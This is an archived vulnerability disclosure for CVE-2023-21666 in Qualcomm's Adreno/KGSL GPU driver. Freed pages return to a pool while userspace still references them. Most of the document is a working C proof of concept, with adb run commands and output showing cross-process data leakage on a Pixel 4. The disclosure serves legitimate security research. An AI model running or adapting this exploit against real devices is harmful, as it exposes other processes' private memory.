@@ -1,0 +1,158 @@
+id: 38755
+date: 05/31/2023
+title: Qualcomm Adreno/KGSL Data Leakage Exploit
+author: Jann Horn
+cves: CVE-2023-21666
+
+Qualcomm Adreno/KGSL: pages can be freed to page pool while having GPU references [on !CONFIG_QCOM_KGSL_USE_SHMEM]
+
+[Tested on a Pixel 4 again with a slightly outdated version of KGSL. I ordered a Pixel 5a but don't have it yet...]
+
+On KGSL builds where CONFIG_QCOM_KGSL_USE_SHMEM is not set (or on older KGSL versions without CONFIG_QCOM_KGSL_USE_SHMEM), KGSL allocates GPU-shared memory from its own page pool. Pages from this pool are inserted into VMAs that don't have any weird flags like VM_PFNMAP set, which means userspace can grab extra references to these pages through get_user_pages() (for example, using vmsplice()). But when GPU-shared memory is freed, KGSL puts the freed pages into its own page pool without checking the page refcount. This means that pages that are still accessible from userspace can be reallocated as GPU memory by another process. I don't know exactly what the security impact of this is and whether it leads to privilege escalation between userspace processes, but it probably leads at least to data leakage?
+
+Testcase that demonstrates cross-process data leakage (in an artificial scenario, between two cooperating processes):
+
+
+#define _GNU_SOURCE
+#include <err.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <signal.h>
+#include <stdlib.h>
+#include <assert.h>
+#include <stdio.h>
+#include <sys/prctl.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+
+#define SYSCHK(x) ({          \\
+  typeof(x) __res = (x);      \\
+  if (__res == (typeof(x))-1) \\
+    err(1, \"SYSCHK(\" #x \")\"); \\
+  __res;                      \\
+})
+
+
+#define KGSL_IOC_TYPE 0x09
+enum kgsl_user_mem_type {
+KGSL_USER_MEM_TYPE_PMEM = 0x00000000,
+KGSL_USER_MEM_TYPE_ASHMEM = 0x00000001,
+KGSL_USER_MEM_TYPE_ADDR = 0x00000002,
+KGSL_USER_MEM_TYPE_ION = 0x00000003,
+KGSL_USER_MEM_TYPE_DMABUF       = 0x00000003,
+KGSL_USER_MEM_TYPE_MAX = 0x00000007,
+};
+
+struct kgsl_gpumem_alloc {
+unsigned long gpuaddr; /* output param */
+size_t size;
+unsigned int flags;
+};
+#define KGSL_MEMALIGN_SHIFT 16
+#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
+#define KGSL_CACHEMODE_SHIFT 26
+#define KGSL_CACHEMODE_WRITECOMBINE 0
+#define KGSL_CACHEMODE_UNCACHED 1
+#define KGSL_CACHEMODE_WRITETHROUGH 2
+#define KGSL_CACHEMODE_WRITEBACK 3
+#define KGSL_MEMTYPE_SHIFT 8
+#define KGSL_MEMTYPE_OBJECTANY 0
+
+#define IOCTL_KGSL_GPUMEM_ALLOC \\
+_IOWR(KGSL_IOC_TYPE, 0x2f, struct kgsl_gpumem_alloc)
+
+struct kgsl_sharedmem_free {
+unsigned long gpuaddr;
+};
+#define IOCTL_KGSL_SHAREDMEM_FREE \\
+_IOW(KGSL_IOC_TYPE, 0x21, struct kgsl_sharedmem_free)
+
+void child_func(void) {
+  int kgsl_fd = SYSCHK(open(\"/dev/kgsl-3d0\", O_RDWR));
+
+  for (int i=0; i<10000; i++) {
+    struct kgsl_gpumem_alloc kga = {
+      .size = 0x1000,
+      .flags = (2<<KGSL_MEMALIGN_SHIFT) | KGSL_MEMFLAGS_USE_CPU_MAP | (KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT) | (KGSL_MEMTYPE_OBJECTANY << KGSL_MEMTYPE_SHIFT)
+    };
+    SYSCHK(ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &kga));
+    unsigned long gpuaddr = kga.gpuaddr;
+    //printf(\"[c] allocated 0x%lx\
+\", gpuaddr);
+    unsigned long *map = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, gpuaddr));
+    map[0] = 0xbbbb000000000000 | (i);
+    //printf(\"[c] mapped as %p\
+\", map);
+  }
+  printf(\"[c] done with spam\
+\");
+  sleep(5);
+}
+
+int main(void) {
+  setbuf(stdout, NULL);
+  setbuf(stderr, NULL);
+
+  int kgsl_fd = SYSCHK(open(\"/dev/kgsl-3d0\", O_RDWR));
+  struct kgsl_gpumem_alloc kga = {
+    .size = 0x1000,
+    .flags = (2<<KGSL_MEMALIGN_SHIFT) | KGSL_MEMFLAGS_USE_CPU_MAP | (KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT) | (KGSL_MEMTYPE_OBJECTANY << KGSL_MEMTYPE_SHIFT)
+  };
+  SYSCHK(ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &kga));
+  unsigned long gpuaddr = kga.gpuaddr;
+  printf(\"[p] allocated 0x%lx\
+\", gpuaddr);
+  unsigned long *map = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, gpuaddr));
+  map[0] = 0xaaaaaaaa;
+  printf(\"[p] mapped as %p\
+\", map);
+
+  int pipefds[2];
+  SYSCHK(pipe(pipefds));
+  struct iovec iov = {
+    .iov_base = map,
+    .iov_len = 0x1000
+  };
+  assert(SYSCHK(vmsplice(pipefds[1], &iov, 1, SPLICE_F_NONBLOCK)) == iov.iov_len);
+
+  SYSCHK(munmap(map, 0x1000));
+  struct kgsl_sharedmem_free arg_sf = {
+    .gpuaddr = gpuaddr
+  };
+  SYSCHK(ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &arg_sf));
+
+  pid_t child = SYSCHK(fork());
+  if (child == 0) {
+    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+    if (getppid() == 1)
+      exit(0);
+    child_func();
+    exit(0);
+  }
+
+  sleep(1);
+  unsigned long later_data;
+  assert(SYSCHK(read(pipefds[0], &later_data, 8)) == 8);
+  printf(\"[p] read 0x%lx\
+\", later_data);
+}
+
+Output:
+
+$ aarch64-linux-gnu-gcc -static -o kgsl-pool-page-uaf kgsl-pool-page-uaf.c && adb push kgsl-pool-page-uaf /data/local/tmp/ && adb shell /data/local/tmp/kgsl-pool-page-uaf
+kgsl-pool-page-uaf: 1 file pushed, 0 skipped. 80.7 MB/s (704808 bytes in 0.008s)
+[p] allocated 0x500000000
+[p] mapped as 0x726bfc4000
+[p] read 0xbbbb00000000115a
+
+
+
+This bug is subject to a 90-day disclosure deadline. If a fix for this
+issue is made available to users before the end of the 90-day deadline,
+this bug report will become public 30 days after the fix was made
+available. Otherwise, this bug report will become public at the deadline.
+The scheduled deadline is 2023-05-09.
+
+Related CVE Numbers: CVE-2023-21666.
+
+#  0day.today [2023-06-08]  #
